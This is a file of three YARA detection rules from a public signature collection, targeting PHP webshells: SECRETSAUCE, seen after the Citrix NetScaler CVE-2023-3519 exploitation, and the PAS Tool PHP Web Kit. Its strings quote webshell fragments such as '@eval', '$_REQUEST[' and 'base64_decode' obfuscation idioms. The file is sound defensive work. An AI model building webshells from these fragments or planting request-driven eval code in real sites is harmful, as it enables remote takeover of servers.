rule SIGNATURE_BASE_WEBSHELL_SECRETSAUCE_Jul23_1 : CVE_2023_3519 FILE {
    meta:
		description = "Detects SECRETSAUCE PHP webshells (found after an exploitation of Citrix NetScaler ADC CVE-2023-3519)"
		author = "Florian Roth"
		id = "db0542e7-648e-5f60-9838-e07498f58b51"
		date = "2023-07-24"
		modified = "2023-12-05"
		reference = "https://www.mandiant.com/resources/blog/citrix-zero-day-espionage"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/expl_citrix_netscaler_adc_exploitation_cve_2023_3519.yar#L79-L100"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "c762d46ae43a3e10453c2ee17039812a06086ac85bdb000cf8308f5196a9dee2"
		score = 85
		quality = 85
		tags = "CVE-2023-3519, FILE"

	strings:
		$sa1 = "for ($x=0; $x<=1; $x++) {" ascii
		$sa2 = "$_REQUEST[" ascii
		$sa3 = "@eval" ascii
		$sb1 = "public $cmd;" ascii
		$sb2 = "return @eval($a);" ascii
		$sb3 = "$z->run($z->get('openssl_public_decrypt'));"

	condition:
		filesize <100KB and ( all of ($sa*) or 2 of ($sb*))
}
rule SIGNATURE_BASE_Webshell_PHP_Web_Kit_V3 : FILE {
    meta:
		description = "Detects PAS Tool PHP Web Kit"
		author = "Florian Roth (Nextron Systems)"
		id = "dc5fa2c9-3e1e-594d-be4f-141e1f4915f1"
		date = "2016-01-01"
		modified = "2023-12-05"
		reference = "https://github.com/wordfence/grizzly"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_apt29_grizzly_steppe.yar#L76-L95"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "21bf0afcd3f8de813ddfe41ef32e45806e9f9d7d3b08ae7ce65017c35e32a868"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$php = "<?php $"
		$php2 = "@assert(base64_decode($_REQUEST["
		$s1 = "(str_replace(\"\\n\", '', '"
		$s2 = "(strrev($" ascii
		$s3 = "de'.'code';" ascii

	condition:
		(( uint32(0)==0x68703f3c and $php at 0) or $php2) and filesize >8KB and filesize <100KB and all of ($s*)
}
rule SIGNATURE_BASE_Webshell_PHP_Web_Kit_V4 : FILE {
    meta:
		description = "Detects PAS Tool PHP Web Kit"
		author = "Florian Roth (Nextron Systems)"
		id = "a5f915cd-b9c5-5cd3-b0a2-c15f6124737a"
		date = "2016-01-01"
		modified = "2023-12-05"
		reference = "https://github.com/wordfence/grizzly"
		source_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/yara/apt_apt29_grizzly_steppe.yar#L97-L116"
		license_url = "https://github.com/Neo23x0/signature-base/blob/c60c8e3408dce1c9597259b8816f7526df9ac778/LICENSE"
		logic_hash = "e2eaa0abd14f4dd08815c44797df707a08df1ea4e04ae69ba67d128a0fe4eff5"
		score = 75
		quality = 85
		tags = "FILE"
		license = "Detection Rule License 1.1 https://github.com/Neo23x0/signature-base/blob/master/LICENSE"

	strings:
		$php = "<?php $"
		$s1 = "(StR_ReplAcE(\"\\n\",'',"
		$s2 = ";if(PHP_VERSION<'5'){" ascii
		$s3 = "=SuBstr_rePlACe(" ascii

	condition:
		uint32(0)==0x68703f3c and $php at 0 and filesize >8KB and filesize <100KB and 2 of ($s*)
}
